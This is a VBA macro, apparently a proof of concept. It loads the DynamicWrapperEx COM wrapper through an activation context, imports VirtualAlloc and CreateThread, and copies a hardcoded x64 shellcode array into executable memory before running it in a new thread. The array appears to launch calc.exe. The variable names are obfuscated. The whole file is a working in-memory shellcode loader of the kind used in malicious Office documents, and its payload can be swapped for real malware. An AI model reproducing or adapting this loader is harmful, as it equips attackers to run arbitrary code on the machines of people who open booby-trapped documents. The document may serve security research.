Sub Activation()
    Dim manifest As String
    manifest = "<?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?><assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""><assemblyIdentity type=""win32"" name=""DynamicWrapperEx"" version=""1.0.0.0""/> <file name=""DynamicWrapperEx.dll""> <comClass description=""DynamicWrapperEx"" clsid=""{1E2F6CDD-E721-4E94-885C-36C95D6A8CC2}"" threadingModel=""Both"" progid=""DynamicWrapperEx""/></file></assembly>"
 
    ' Change TMP Environment variable
    Dim env As Object
    Set env = CreateObject("WScript.Shell")
    env.Environment("Process").Item("TMP") = "C:\Users\Context\Desktop\DynamicWrapperEx-master\out\build\x64-Debug (default)\Debug\"

    ' Create ActivationContext
    Dim dwx As Object
    Set dwx = CreateObject("Microsoft.Windows.ActCtx")
    dwx.ManifestText = manifest
    
    ' Create Automation server
    Dim server As Object
    Set server = dwx.CreateObject("DynamicWrapperEx")
    
    ' Execute code ....
    server.DwRegister "kernel32.dll", "VirtualAlloc"
    server.DwRegister "kernel32.dll", "CreateThread"
    server.DwRegister "kernel32.dll", "WaitForSingleObject"
    
    Dim Muhkcsnv As Variant
    Muhkcsnv = Array(72, 131, 228, 240, 232, 192, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 139, 128, 136, 0, _
        0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, _
        208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 87, 255, 255, 255, 93, 72, 186, 1, 0, 0, 0, 0, 0, 0, 0, 72, 141, 141, 1, 1, 0, 0, 65, 186, 49, 139, 111, 135, 255, 213, 187, 240, 181, 162, 86, 65, 186, 166, 149, 189, 157, 255, 213, _
        72, 131, 196, 40, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 89, 65, 137, 218, 255, 213, 99, 97, 108, 99, 46, 101, 120, 101, 0)
        
    Dim lpAddress As LongLong
    lpAddress = server.VirtualAlloc(0, UBound(Muhkcsnv), &H1000, &H40)
    
    For Aemcpxza = LBound(Muhkcsnv) To UBound(Muhkcsnv)
        i = server.WriteByte(CByte(Muhkcsnv(Aemcpxza)), CLngLng(lpAddress), CLng(Aemcpxza))
    Next Aemcpxza
    
    hThread = server.CreateThread(0, 0, CLngLng(lpAddress), 0, 0, 0)
    server.WaitForSingleObject hThread, -1
End Sub
